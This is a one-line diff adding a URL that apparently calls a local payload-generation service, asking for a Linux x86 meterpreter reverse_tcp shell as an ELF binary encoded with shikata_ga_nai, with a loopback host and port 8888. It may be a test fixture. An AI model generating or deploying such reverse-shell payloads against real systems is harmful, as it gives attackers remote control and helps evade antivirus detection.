@@ -1,0 +1,1 @@
+http://localhost:4567/payload?payload=linux%2Fx86%2Fmeterpreter%2Freverse_tcp&format=elf&encoder=x86%2Fshikata_ga_nai&lhost=127.0.0.1&lport=8888
